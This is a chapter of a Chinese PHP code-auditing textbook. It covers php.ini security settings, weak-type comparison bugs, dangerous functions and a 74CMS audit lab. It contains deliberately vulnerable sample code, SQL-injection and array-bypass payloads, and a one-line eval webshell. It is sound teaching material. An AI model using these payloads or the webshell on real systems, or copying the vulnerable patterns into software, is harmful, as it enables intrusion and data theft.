代码审计是安全学习阶段高阶内容，该部分也是安全行业要求具备的技能。本单元主要介绍了代码审计的基础知识。经过本单元的学习，读者需了解代码审计的基本含义、了解代码审计流程、代码审计工具的使用方法。同时本单元设计了实验：Windows与Linux搭建74CMS。通过本单元的学习对代码审计环境搭建、基本方法与流程有一定理解。



 

# 单元2 代码审计前导

**单元概述：**

本单元介绍了进行代码审计的前导知识，分为四个部分进行介绍。

第一部分介绍了影响代码审计结果的常见PHP核心安全配置，从而为以后学习各种安全漏洞审计奠定基础，例如：宽字节注入，文件包含，代码执行等。

第二部分介绍代码审计基本函数及弱类型安全问题，包括：CMS审计常用的调试函数、关注的漏洞点。

第三部分介绍常见Web安全漏洞的危险函数，从而对后续安全审计奠定基础。

第四部分介绍了常见的代码审计三种方法：通读全文法、敏感函数参数回溯法、定向功能分析法。使用不同审计方法对CMS系统进行代码审计，使读者理解不同代码审计方法的流程。

**单元构图：**

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image126.jpg)

**单元目标：**

\1.  了解影响代码审计的常见配置选项；

\2.  了解代码审计中的基本函数；

\3.  熟悉代码审计中各种安全漏洞的危险函数；

\4.  掌握三种常见代码审计方法。

## 2.1 影响代码审计的配置

在进行代码审计之前需要对PHP核心配置文件进行介绍，这是因为很多的安全漏洞往往会根据代码的配置环境不同导致其执行结果存在很大的差异。在很多时候我们通过代码审计发现了一个非常高危的漏洞，但是由于其配置问题导致构造的payload无法正常执行。

虽然随着PHP版本的更新很多的不安全配置参数已经废弃，但是熟悉PHP各版本中的配置文件参数依旧是熟练掌握代码审计的必备基础知识。因此，本节将对影响代码审计结果的核心PHP配置参数进行介绍。

### 2.1.1 PHP的配置文件

（1）php.ini文件

php.ini是PHP的一个全局配置文件，对整个Web服务起作用。该文件将在PHP启动时被读取，PHP的运行模式存在四种：CGI（通用网关接口模式）、CLI（命令行运行模式）、Web模块模式（apache等Web服务器运行的模块模式）、FASTCGI（常驻型的CGI模式）。对于Web模块模式的PHP而言，php.ini仅在Web服务器启动时读取一次。对于CGI和CLI版本的PHP而言，php.ini每次调用都会被读取。Apache Web服务器在启动时会把目录转到根目录中，这将导致PHP尝试在根目录下读取php.ini文件。

（2）user.ini文件

user.ini和.htaccess一样是目录的配置文件，user.ini就是用户自定义的一个php.ini。自PHP 5.3.0版本开始，PHP支持基于每个目录的.htaccess风格的INI文件，此类文件仅被CGI/FASTCGI处理。该文件由PHP加载，其配置项就是PHP的配置项，但该文件可以放到每个网站的根目录从而为每个网站定制自己单独的配置文件。

（3）PHP的配置语法

PHP配置文件语法格式为：



指令名（directive） = 值（value）



其指令名存在大小写敏感特性，例如：foo=bar与FOO=bar是不同的。其值可以是：

l 用引号界定的字符串，例如“foo”；

l 一个数字，例如：0，1，34，-1；

l 一个PHP常亮：例如：E_ALL、M_Pi；

l 一个INI常量，例如：ON、OFF、none；

l 一个表达式，例如：E_ALL&~E_NOTICE。

### 2.1.2 传递变量相关的PHP配置

1、全局变量注册开关（register_globals）

该配置在开启情况下，PHP会将HTTP的$_POST、$_GET、$_COOKIE、$_ENV、$_SESSION数组中的$key=>$value直接注册为变量。该方法将上述方法的传递参数自动注册为程序中的全局变量并初始化为该参数传递对应的值，使这些参数可以直接在PHP脚本中使用。例如：$_POST['passwd']会被注册为变量$passwd。

该配置的开启虽然方便了程序调用参数，但是也将造成很严重的安全问题：

l 由于全局变量无法看到变量从哪获取，从而不利于代码的阅读；

l 变量之间会相互覆盖，引起变量覆盖漏洞；

下面给出测试代码：



<?php

if($user=='test'){

  echo 'true';}

?>



  执行结果如图2-1所示，使用HTTP的GET方式传递user参数自动初始化值为test，且通过比较返回true。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image128.jpg)

图2-1 register_globals配置测试图

2、短标签开关（short_open_tag）

该配置在开启情况下，PHP将允许使用标志的缩写形式“<? xxx?>”。如果该配置关闭，则需使用PHP代码的完成形式“<?php xxx?>”。同时，该配置还会影响到“<?echo $a ?>”形式的代码，将其缩写形式为“<?=$a ?>”。

某些网站的过滤函数会对敏感字符“<?php”进行检查，若该配置开启，则可以实现使用缩写形式上传敏感内容，绕过敏感字符检查。

下面给出测试代码：



<?php $user='test';?>

<?=$user?>



执行结果如图2-2所示，代码“<?=$user?>”是“<?php echo $user?>”的缩写。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image130.jpg)

图1-28 register_globals配置测试图

### 2.1.3 安全模式

safe_mode（安全模式）配置是PHP内置的一种安全机制，该安全机制可以有效的防止文件操作函数与命令执行函数的执行。默认情况下，php.ini文件并没有开启安全模式（即php.ini配置文件中safe_mode = off），且该特性自PHP5.4.0版本已经被移除。

1、安全模式下可防御函数

l 文件操作函数

safe_mode配置开启后，函数unlink、file、include使用时将会受限。例如：若公用文件放置于非Web服务目录下，则include函数将无法正常加载公用文件。需使用safe_mode_include_dir指令配置可加载目录，从而提升安全性，有效防止文件包含漏洞。

l 命令执行函数

safe_mode配置开启后，函数system、exec、popen、shell_exec等被使用时将会受限。例如：使用exec函数执行系统指令时，将提示函数执行错误。需使用safe_exec_dir指令配置脚本执行目录，从而提升安全性，有效的防止命令注入漏洞。

2、安全模式下执行程序主目录（safe_mode_exec_dir）

如果PHP使用了安全模式，可通过如下方法进行配置：



safe_mode_exec_dir = /var/www/html



其值必须使用“/”作为目录分隔符，且只允许在该配置目录下执行。此配置将导致system函数和其他程序执行函数都被拒绝启动不再此目录中的程序。

3、禁用类/函数（disable_classes、disable_functions）

在php.ini配置文件中，可以使用“disable_classes”方法禁用类，使用“disable_functions”方法禁用函数。若存在多个配置的值则使用逗号进行分隔且值必须是函数名称。其配置方法如下：



disable_functions = opendir,readdir,scandir,fopen,unlink



### 2.1.4 文件上传及目录权限相关配置

1、设置上传及上传文件大小（file_uploads、upload_max_filesize）

php.ini中参数file_uploads用来设置PHP是否允许文件上传，该功能默认情况下处于开启状态。参数upload_max_filesize用于设置PHP所支持的最大文件大小，默认情况下为2M。其配置如下：



file_uploads = On

upload_max_filesize = 2M



2、文件上传临时目录（upload_tmp_dir）

php.ini中参数upload_tmp_dir用来设置上传临时文件保存的目录，该功能默认情况下为空，其采用系统临时目录。Windows系统为C:\Windows\Temp，Linux系统为/tmp。

3、用户访问目录限制（open_basedir）

使用open_basedir参数可以控制PHP脚本能访问的目录，这样能够避免PHP脚本访问禁止访问的文件，一定程度上限制Webshell的危害。一般将该参数设置为只能访问网站的根路径（即PHP文件所在的目录）和/tmp目录（多个目录需要使用分号:进行分隔），这样能够有效的防止PHP木马跨站运行，其配置如下：



open_basedir = .:/tmp/



### 2.1.5 魔术引号及远程文件相关配置

1、magic_quotes_gpc（魔术引号自动过滤配置，简称“GPC”）

该配置在开启情况下，可对GET、POST、COOKIE方式传递的参数进行过滤。过滤的符号包括单引号、双引号、反斜杠、空字符，将上述字符前自动添加反斜杠（\）从而扰断恶意脚本代码执行。该配置参数可普遍防御SQL注入、XSS漏洞等恶意脚本的执行（如果使用编码绕过或其他特殊方式绕过则无法防御）。

下面给出测试代码：



<?php 

echo $_GET['a'].'</br>';

echo urldecode($_SERVER['HTTP_REFERER']);

?>



magic_quotes_gpc配置开启后，使用GET方式传递参数a值为：1' and 1=1\"，如图2-3所示。可以发现单引号、反斜杠及双引号已经自动加上反斜杠。注意：该配置不能过滤$_SERVER传递参数，例如：HTTP_X_FORWARDED_FOR、HTTP_REFERER等参数都不支持过滤。（该配置自PHP5.4版本后废弃使用，本书使用版本为PHP5.2.17）

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image132.jpg)

图2-3 magic_quotes_gpc配置测试图

与magic_quotes_gpc类似的配置为magic_quotes_sybase。上述两种配置都可过滤HTTP中GET、POST、Cookie等传递的参数，但是两者过滤的效果有所不同。magic_quotes_sybase只能将空字符和单引号转换为双引号。当magic_quotes_sybase设置为on以后，magic_quotes_gpc配置的功能将被覆盖。

2、magic_quotes_runtime（魔术引号自动过滤配置）

该配置与选项magic_quotes_gpc过滤效果类似，都可将单引号、双引号、反斜杠、空字符经过滤后自动加上反斜杠。唯一不同的是magic_quotes_gpc选项只能过滤经过HTTP请求传递来的参数，而magic_quotes_runtime可过滤文件或数据库中获取的数据。该配置的开启可以有效防止从数据库获取恶意脚本执行的攻击方式，例如：存储型XSS漏洞。（该配置自PHP5.4版本后废弃使用，本书使用版本为PHP5.2.17）

下面给出测试代码：



<?php

ini_set("magic_quotes_runtime","1");

echo file_get_contents("test.txt");

?>



测试文件test.txt内容为一句话木马如下：



@eval($_POST['Cknife']);



执行结果如图2-4所示，test.txt文件中的内容在单引号前自动添加了反斜杠。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image134.jpg)

图2-4 magic_quotes_runtime配置测试图

3、allow_url_include（远程文件包含配置）

该配置可以控制是否允许远程文件访问，该配置将直接影响“远程文件包含”漏洞的执行效果，在PHP5.2.0版本后默认该配置处于关闭状态。

开启该配置参数，并给出测试代码：



<?php include $_GET['a']; ?>



上述代码执行效果如图2-5所示。通过修改对端服务器的传递参数“a”为其他网址路径，从而控制服务器访问其他网址或其他服务器内部文件。严重情况下，该漏洞可控制服务器访问远程木马。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image136.jpg)

图2-5 allow_url_include配置测试图

与allow_url_include配置类似的还有allow_url_fopen，通过开启该配置可以设置是否允许打开远程文件。

### 2.1.6 错误信息相关配置

  代码审计过程中，通常需要设置程序错误日志的开启，本小节将对程序错误信息配置进行介绍。

1、错误信息控制

php.ini中参数display_error用来设置将错误信息作为程序输出，在站点发布后应将该功能关闭，防止信息泄露。在代码审计过程中，应将该功能打开，利用调试程序代码。

2、设置错误报告级别

php.ini中参数error_reporting用来设置错误信息显示级别，错误信息级别包括：E_ALL、E_ERROR、E_RECOVERABLE_ERROR、E_WARNING、E_PARSE、E_NOTICE等。代码是审计过程中，将该配置参数设置为最高级别可以显示所有问题且方便差错，推荐使用的配置为：E_ALL或E_STRICT（即所有级别显示）。

3、错误日志

开启错误日志记录功能以后，需要为错误日志参数进行配置，其配置参数包括：

l error_log：定义错误信息位置，需对Web用户有写入权限，如果不定义则默认写入到Web服务器的错误日志中。

l log_errors：定义错误日志是否开启。

l log_errors_max_length：定义错误日志关联信息的最大长度，若设为0则表示无限长度。

## 2.2 代码审计基本函数

本小节将介绍学习代码审计过程中经常使用的基本函数，包括：调试函数、参数传递函数、系统环境变量。

### 2.2.1 代码调试函数

代码调试函数经常可以用来打印变量的状态和数据结构等信息。在代码审计过程中，如果发现某段代码逻辑较为复杂，或对某个参数值存在疑惑时，可以在程序代码中加入代码参数打印函数，将有疑惑的参数值进行打印。同时还可以使用特定函数获取当前系统进程的类、函数、常量、变量。

1．状态参数打印函数

代码调试函数中可打印参数值或状态的函数包括：echo、print_r、var_dump、exit、die等。

l echo：用于输出字符串或变量的值（不能输出数组的值）。

l print_r()：用于输出一个数组的值。

l var_dump()：输出一个变量的结构，该变量包括：普通变量、数组、对象的参数。

l exit或die：输出消息并停止程序执行流程。

2.获取当前进程所有变量、函数、常量、类

代码审计过程中通常对某些值产生疑惑，这可能是程序中某处已定义过的变量或函数，在审计过程中有遗漏，这就需要将程序运行过程中当前进程的函数变量进行打印，这些方法包括：get_defined_vars(void)、$GLOBALS、get_defined_functions、get_defined_contants、get_include_files、get_declared_classes等。

l $GLOBALS：PHP中有一个不为很多人所用的超全局变量$GLOBALS。合理使用这个变量能使工作变得更加有效率，$GLOBALS引用全局作用域中可用的全部变量（一个包含了全部变量的全局组合数组），与所有其他超全局变量不同，$GLOBALS在PHP代码中任何地方总是可用的。

l array get_defined_vars(void)：此函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。例如：



<?php

$b = array(1,1,2,3,5,8);

$arr = get_defined_vars();

print_r($arr["b"]);    // 通过get_defined_vars函数直接打印 $b变量

// 例如：/usr/local/bin/php

echo $arr["_"];  // 打印 PHP 解释程序的路径（如果 PHP 作为 CGI 使用的话）

print_r($arr["argv"]); // 打印命令行参数（如果有的话）

print_r($arr["_SERVER"]); // 打印所有服务器变量

print_r(array_keys(get_defined_vars())); // 打印变量数组的所有可用键值

?>



l get_defined_functions(void)：获取所有已定义的函数，包括内部函数和用户定义函数，例如：



<?php

function myrow($id, $data)

{return "<tr><th>$id</th><td>$data</td></tr>\n";}

$arr = get_defined_functions();

print_r($arr);  //将已定义的函数打印[user] => Array ( [0] => myrow)

?>



l get_defined_constants(void)：返回可用常量，包括：系统常量和用户定义常量。

l get_include_files()：返回包含的文件路径的数组（使用include函数和require函数包含的）。

l get_declared_classes(void)：返回所有可用类，包括：系统类和用户定义的类。

### 2.2.2 可能存在漏洞的点

很多的安全漏洞都是由于参数的过滤不严导致的，在网站中参数的获得通常包括：HTTP头、HTTP请求参数、系统环境变量，下面对这几种代码形式进行介绍：

l $_SERVER

$_SERVER 是包含了HTTP头信息、路径、脚本位置等信息的数组，该数组中的项目由Web服务器创建。很多安全漏洞的漏洞点都是从$_SERVER变量中获取，例如：基于HTTP头的SQL注入等。

$_SERVER可以获取的信息包括：

  $_SERVER[‘HTTP_HOST’]：获取玉明或主机名地址

  $_SERVER[‘HTTP_X_FOREARDED_FOR’]：获取原始客户端IP地址

  $_SERVER[‘PHP_SELF’]：返回当前执行脚本文件名

  $_SERVER[‘QUERY_STRING’]：获取网址参数

  $_SERVER[‘HTTP_USER_AGENT’]：获取用户的User-Agent

  $_SERVER[‘HTTP_REFERER’]：获取用户来源

l HTTP请求参数

  $_REQUEST：接收各种HTTP请求方法

  $_GET：接收HTTP的GET请求方法

  $_POST：接收HTTP的POST请求方法

  $_FILES：文件上传相关

l $_ENV

$_ENV有名为系统环境变量，它是一个包含服务器端环境变量的数组，是PHP中的一个超级全局变量，我们可以在PHP的任意地方直接访问$_ENV。$_ENV的输出方法包括：

  var_dump($_ENV);

  print_r($_ENV);

  foreach($_ENV as $key=>$val){echo $key.$val;}

## 2.3 弱类型的安全

PHP进行弱类型数据比较过程中，通常都存在外来数据变量弱类型转换的问题，这导致转换后的数据进入到判断条件体内，这极可能导致安全问题。本小节将对PHP代码中常见的弱类型比较、编码绕过情况进行介绍，从而加强PHP代码审计安全意识。

PHP的弱类型判断比较的函数包括：is_numeric()、in_array()、strcmp()、双等于判断、strpos()。

（1）  is_numeric函数

is_numeric函数的作用是检测变量是否为数字，如果是数字则返回true、否则返回false。

该函数的弱类型问题是其支持十六进制0x格式，攻击者把Payload改成十六进制0x形式后，is_numeric会先判断十六进制是否为数字型，如果是则返回真，从而进入了条件语句。如果再把该Payload代入到SQL语句中则进入MySQL数据库，MySQL数据库会对HEX进行解析成字符串存入到数据库中，如果这个字段再被取出来二次利用，就可能导致二次注入、XSS等安全漏洞。

下面给出is_numeric函数存在安全漏洞的示例代码如下：



<?php

$type= **is_numeric**($_GET['id'])?$_GET['id']:0;

$sql="insert into test(id,type)values(1,$type);";

echo $sql;

?>



使用HTTP的GET方式传递的参数id为0x31206f722031 （该值是‘1 or 1’的16转换转换结果），使用该参数进行数据库查询，其结果如图2-6所示。如果再重新查询这个表的字段，不做过滤带入另一个SQL语句，将会造成二次注入。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image138.jpg)

图2-6 数据库查询结果图

（2）in_array函数

in_array函数的作用是判断一个值是否在某个数组里面，如果在数组里则返回true，否则返回false。该函数的安全问题是在进行比较之前会自动对比较数据进行类型转换，如果转换后的数据匹配成功则会绕过检测。

in_array函数存在安全漏洞的示例代码如下：



<?php

if (**in_array**($_GET['id'],array(1,2,3,4)))

{$sql="select * from admin where id ='".$_GET['id']."'";}

echo $sql;

?>



上述代码的作用是判断HTTP的GET方式传递的参数id是否在数组里，如果在里面则会拼接SQL语句，但是此类代码存在in_array函数的安全问题。当用户发送的HTTP请求为/test.php?id=1’ union select 1,2,3,4#，则会绕过in_array过滤，最终拼接的SQL语句结果为select * from admin where id ='1' union select 1,2,3,4#'。

（3）strcmp函数

strcmp函数的作用是比较两个字符串，如果str1小于str2返回负数；如果str1大于str2返回正数；如果两者相等则返回 0。

该函数的安全问题是在进行比较之前会自动将两个参数先转换为string类型，当使用数组与字符串记性比较时将返回0，如果参数不是string类型则直接返回。

strcmp函数存在安全漏洞的示例代码如下：



<?php

$id=$_GET['id'];

if (**strcmp**('test',$id)) {

echo 'YES!';

} else{

echo 'NO!';}

?>



上述代码的作用是判断HTTP的GET方式传递的参数id与‘test’是否相等，由于strcmp函数比较漏洞导致当访问路径为/test.php?id[]=时将打印YES。

（4）双等于与三等于

PHP语言中双等于（==）与三等于（===）的主要区别是：

l “==”在进行比较时，会先将字符串类型转换为相同再进行比较。

l “===” 在进行比较时，会先判断两种字符串类型是否相同再进行比较。

如果比较一个数字和字符串，或者比较涉及到数字内容的字符串，则字符串会被装换为数值并比较按照数值来进行。

双等于“==”存在安全漏洞的示例代码如下：



<?php

  var_dump($_GET[‘var’]==2);

?>



上述代码的作用是判断var是否与2相等，将判断结果的类型与值显示。当攻击者访问的路径为/1.php?var=2aaa时，将比较2aaa与2是否相等，打印结果类型为bool(true)。这绕过了双等于比较并输出，如图2-7所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image140.gif)

图2-7 双等于测试图

如果使用三等于“===”判断，其案例代码如下：



<?php

  var_dump($_GET[‘var’]===2);

?>



由于三等于“===”在数据类型比较前不会对数据进行类型转换，所以其相对安全，当用户访问的路径为/1.php?var=2aaa时，输出结果为false，如图2-8所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image142.gif)

图2-8 三等于测试图

（5）strpos函数

strpos函数作用是查找字符串在另一字符串中第一次出现的位置。该函数的安全问题是如果strpos()传入的参数是数组类型，则会返回NULL，而如果在判断函数中连用strpos函数就很有可能造成程序的错误判断。案例代码如下：



<?php

$flag = "flag";

if (isset ($_GET['password'])) {

  if (**ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE**)

​     echo 'You password must be alphanumeric';

  else if (**strpos ($_GET['password'], '--') !== FALSE**)

​     die('成功: ' . $flag);

  else

​     echo 'Invalid password';}

?>



上述代码中，ereg函数搜索由指定的字符串作为由模式指定的字符串，如果发现模式则返回true，否则返回false。ereg函数会对将传入的password从“a-z,A-Z,0-9”`中`进行匹配，将密码限制在这三种字符中。同时，strpos()需要匹配到“--”才能输出“成功”，所以我们需要绕过strpos()函数。利用strpos()函数的安全问题，可构造Payload为：http://ip/test.php?password[]=1，从而使得strpos ($_GET['password'], '--')判定为true。

（6）md5函数绕过

Md5函数的作用是对用户传递的字符串进行md5散列计算，该函数在很多网站开发中进程使用，尤其是用户密码再存入数据库之前，都需要使用md5函数对密码进行加密。

但是，该函数同样存在着安全问题。md5函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL，从而使得数值在比较后相等。案例代码如下：



<?php

$flag = 'flag{test}';

if (**isset($_GET['username']) and isset($_GET['password']**)) {

  if (**$_GET['username'] == $_GET['password']**)

​     print 'Your password can not be your username.';

  else if (**md5($_GET['username']) === md5($_GET['password'])**)

​     die('成功: '.$flag);

  else print 'Invalid password';

}

?>



上述代码通过HTTP的GET方式获取用户名（username）和密码（password），首先判断两个参数是否设置，然后只有当用户名与密码被md5加密后的结果相等，才打印“成功”。

借助md5无法加密数组的问题，Payload为：Payload:?username[]=1&password[]=2，从而绕过md5加密相等的判断。

除了上述介绍的函数strpos和md5不能正确处理数组变量外，sha1()函数也无法处理数组类型，通过传递参数为数组，sha1函数将报错并返回false，从而造成程序错误判断。

## 2.4 常见危险函数

本节将对代码审计过程中常见的危险函数进行介绍，其主要分为以下函数：代码执行函数、包含函数、命令执行函数、文件操作函数、变量覆盖函数、特殊函数。

### 2.3.1 代码执行函数

  本小节给出代码执行漏洞中常见的危险函数：

（1）mixed eval(string $code)

eval函数可以将参数$code作为PHP代码执行。

（2）bool assert(mixed $assertion [,string $description])

assert函数用来检查一个断言是否为False，其会将$assertion作为PHP代码执行。可以使用assert函数代理eval函数执行代码。

（3）mixed preg_replace(mixed $pattern, mixed $replacement, mixed $subject [,int $limit=-1 [,int &$count]])

preg_replace函数将搜索subject中匹配pattern的部分，用replacement进行替换。当pattern部分为“/e”时，其会作为PHP代码进行执行，例如：preg_replace(“/test/e”,$_GET[‘h’],“test”);。

（4）string create_function(string $args, string $code)

创建一个匿名函数，并返回一个唯一的函数名。

（5）string array_map(callable $callback,array $array[array,array2……])

该函数中第一参数为回调函数名，第二参数为回调函数的数组，若回调函数为危险函数将引起代码执行漏洞。

（6）mixed call_user_func(callable $callback [,mixed $parameter [, mixed $...]])

第一个参数$callback是被调用的回调函数，其余参数是回调函数的参数。

（7）mixed call_user_func_array(callable $callback,array $param_arr)

与call_user_func函数类似，不同点是将参数数组作为回调函数的参数传入。

### 2.3.2 包含函数

  本小节给出文件包含漏洞中常见的危险函数，若上述危险函数的传参可控，则将引起文件包含漏洞。

（1）include函数

包含并运行指定文件，当包含外部文件发生错误时会产生警告（E_WARNING），但是整体PHP代码会继续执行。

（2）require函数

包含并运行指定文件，当包含的挖补文件发生错误使会产生报错（E_COMPILE_ERROER）导致PHP脚本将终止运行。

（3）require_once函数

与require函数相同，唯一区别是：使用该函数包含文件时，PHP会检查该文件是否被包含过，如果包含过则不会再次包含。

（4）include_once函数

与include函数类似，唯一区别是：使用该函数包含文件时，PHP会检查指定文件是否被包含过，如果是则不会再次包含。

### 2.3.3 命令执行函数

  本小节给出命令执行漏洞中常见的危险函数，若上述危险函数的传参可控，则将引起命令执行漏洞。

（1）exec()

该函数是PHP的内置函数，其用于执行外部程序。

（2）system()

该函数将执行一个外部应用程序的输入并显示输出结果。

（3）passthru()

该函数将执行外部命令同时显示，无需使用echo或return查看结果。

（4）proc_pepen()

用于执行一个命令，并且打开用来输入输出的文件指针。

（5）popen()

通过popen()的参数传递一条命令，并对popen()所打开的文件进行执行。

（6）shell_exec()

该函数是PHP的内置函数，通过shell执行命令并以字符串的形式返回结果。

（7）反单引号（`）

是PHP执行运算符，PHP将尝试将反单引号中的内容作为shell命令来执行，并将其输出信息返回。

### 2.3.4 文件操作函数

本小节给出文件操作漏洞中常见的危险函数，任意文件的读取、写入、删除漏洞通常受到以下函数控制：

1．$_FILES文件相关

（1）$_FILES[‘myFile’][‘name’]：获取文件的名称。

（2）$_FILES[‘myFile’][‘type’]：获取文件的MIME类型，需要浏览器支持。

（3）$_FILES[‘myFile’][‘type’]：获取文件上传的大小，单位是字节。

（4）$_FILES[‘myFile’][‘tmp_name]：文件被上传之后，系统临时存储的文件名。

（5）$_FILES[‘myFile’][‘error’]：和文件上传相关的错误代码。

2.任意文件操作漏洞危险函数

（1）copy()：该函数是用来拷贝文件。

（2）file_get_contents()：该函数可以将整个文件读入到一个字符串中。

（3）file_put_contents()：该函数可将一个字符串写入文件中。

（4）file()：把整个文件读入到一个数组中。

（5）fopen()：用来打开文件或打开URL。

（6）move_uploaded_file()：用来将上传的文件移动到新的位置。

（7）readfile()：输出文件。

（8）rename()：为文件或目录重命名。

（9）rmdir()：删除目录。

（10）unlink()或delete()：删除文件。

### 2.3.5 变量覆盖函数

本小节给出变量覆盖漏洞中常见的危险函数：

（1）void parse_str(string $str [,array &$arr])

如果$str是通过URL传递的字符串参数，则将它解析成变量并设置到当前作用域中。

（2）int extract(array &$var_array [,int $extract_type = EXTR_OVERWRITE [,string $prefix=NULL]])

本函数用来将变量从数组中导入到当前的符号表中，检查每个键名看是否可以作为一个合法的变量名，同时也检查和符号表中已有变量名是佛福是否冲突。

（3）bool mb_parse_str(string $encoded_string [,array &$result])

解析GET、POST、COOKIE数据并设置全局变量。

（4）bool import_request_variables(string $types [,string $prefix])

  将GET、POST、COOKIE变量导入到全局作用域中，如果禁止了register_globals但又想使用全局变量，可以使用该函数。

### 2.3.6 特殊函数

本小节给出代码审计中常见的特殊函数，这些函数涉及的安全问题包括：信息泄露、软链接读取文件、环境变量、配置设置、数字判断、数组判断。下面对这些特殊函数进行介绍：

（1）信息泄露函数

l bool phpinfo()

该函数将输出PHP的大量信息，包括：PHP编译选项、启动的扩展、PHP版本、服务器信息、PHP环境变量、操作系统版本信息、path变量、配置选项的本地值和主值、HTTP头和PHP授权信息等。

（2）软链接函数—读取文件内容

l bool symlink(string $target, string $link)

symlink()对于已有的$target变量建立一个名称为$link的软链接。

l string readlink(string $path)

readlink()根据传参$path读取其指向的文件内容。

（3）环境变量

l string getenv(string $varname)

获取系统环境变量的值，包括：SERVER_NAME（主机名）、SERVER_PROTOCOL（通信协议和版本）、REQUEST_METHOD（访问页面的请求方法）等。

l bool putenv(string $setting)

添加setting到服务器环境变量中，环境变量仅存活于当前请求期间，在请求结束时环境会恢复到初始状态。

（4）配置相关函数

l string ini_get(string $varname)

该函数用来返回配置选项的值。

l string ini_set(string $varname, string $newvalue)

l string ini_alter(string $varname, string $newvalue)

上述函数用于设置配置选项的值，此选项会在脚本运行时保持设置的值，并在脚本结束时恢复原有值。

l void ini_restore(string $varname)

该函数用来恢复指定的配置选项到原有的值。

（5）数字判断

l bool is_numeric(mixed $var)

该函数如果变量$var是数字和数字字符串则返回TRUE，否则返回FALSE。该函数存在的安全问题是：如果仅使用is_numeric函数判断而不使用intval函数转换就有可能插入16进制的字符串到数据库中，进而可能导致SQL二次注入。

（6）数组相关

l bool in_array(mixed $needle, array $haystack [,bool $strict = FALSE])

判断一个值是否在某个数组里面，如果在数组里则返回TRUE，否则返回FALSE。该函数的安全问题是在进行比较之前会自动对比较数据进行类型转换，如果转换后的数据匹配成功则会绕过检测。

## 2.4 代码审计思路

本小节将介绍学习代码审计过程中常见的代码审计思路，只有理解了代码审计思路，才能更高效的挖掘出有质量的漏洞。虽然，很多有经验的审计人员也有自己独有的审计技巧，但总体来说都是从上述三种思路演变而来。

代码审计包括三个阶段：审计前准备工作、了解审计对象全局结构、审计实施。

1.审计前准备阶段

审计前准备工作需要从官网站到对应版本的源码包，并准备好代码审计工具。在本地搭建网站，能够实现使用PhpStorm工具一边审计一边调试，进行实时的数据动态跟踪。

2.了解审计对象全局结构

在PHP网站中，常见的目录包括：主目录、模块目录、插件目录、上传目录、模板目录、数据目录、配置目录等，审计人员需对上述目录有所了解从而掌握该网站的整体目录结构。同时，需要查看程序的配置文件、入口文件、公共函数、安全过滤文件，从而对网站大体功能有所了解。

3.审计实施阶段

在审计实施阶段，审计人员从以下方面进行审计分析：

l 配置审计分析环境

l 熟悉审计系统的业务流程

l 分析程序使用的编程框架

l 工具自动化审计分析

l 人工审计分析

审计实施阶段中，常用思路包括以下三种（参考《代码审计-企业级Web代码安全架构》）：

（1）  敏感函数参数回溯法

（2）  定向功能分析法

（3）  通读全文法

本书建议使用上述三种方法相结合的方式进行代码审计。首先，使用通读全文法对程序的整体结构与目录、程序的全局过滤函数、通用函数、配置信息等进行了解。然后，根据定向功能法对每一项功能进行代码审计。最后，针对指定功能使用敏感函数参数回溯法对参数值数据传递流程进行分析。

### 2.4.1 敏感函数参数回溯法

使用敏感参数来逆向追踪参数的传递过程，是目前使用最多代码审计方法，因为大多数漏洞是由于函数中编写代码考虑不周全导致的。而这些函数很多都存在敏感的关键字可以初步判定为敏感函数，进而分析这些函数是否存在安全漏洞。

敏感函数参数回溯法的优劣：

l 优点：只需要搜索相应的敏感关键字，既可快速挖掘漏洞，挖掘效率质量高；

l 缺点：对代码整体结构不清晰，对程序的整体框架了解不深入，在挖掘漏洞时定位漏洞需要花费时间，无法对业务逻辑漏洞进行挖掘。

### 2.4.2 实验：敏感函数参数回溯法分析74CMS案例

· 实验介绍

本实验以74CMS3.0为例，使用敏感函数参数回溯进行代码审计，让读者理解该方法的审计步骤，该案例审计流程如图2-6所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image144.jpg)

图2-6 敏感函数参数回溯法流程图

· 预备知识

参考2.4.1节：敏感函数参数回溯法。

· 实验目的

了解敏感函数参数回溯法审计流程。

· 实验环境

Windows操作系统主机；74CMS3.0环境；Seay审计工具。

· 实验步骤

首先使用Seay代码审计系统打开预审计程序，并点击“自动审计”按钮，查找出可能存在敏感函数参数的代码列表，如图2-7所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image146.jpg)

图2-7 Seay自动审计列表

从敏感函数参数列表中挑选一条记录进行敏感函数参数回溯审计，如图2-8所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image148.jpg)

图2-8 需审计选项

双击本条记录定位到漏洞代码，然后审计代码中的可控变量传递过程，如图2-9所示。代码“$sql="select * from ".table('explain')." where id=".$id." LIMIT 1";”中可控变量为“$id”。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image150.jpg)

图2-9 审计SQL语句

从界面左侧的“文字查找”栏中可以查看当前PHP代码中存在的函数列表及变量列表，从变量列表中选择上述已定位的可控变量“$id”，即可看到该PHP页面中所有关于该变量的赋值传递过程，如图2-10所示。点击该变量的赋值选项可自动定位到指定位置。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image152.jpg)

图2-10 可控变量id调用信息

至此确定了某可疑函数中的可控变量$id的传递过程，如图1-25所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image154.jpg)

图1-25 可控变量id调用图

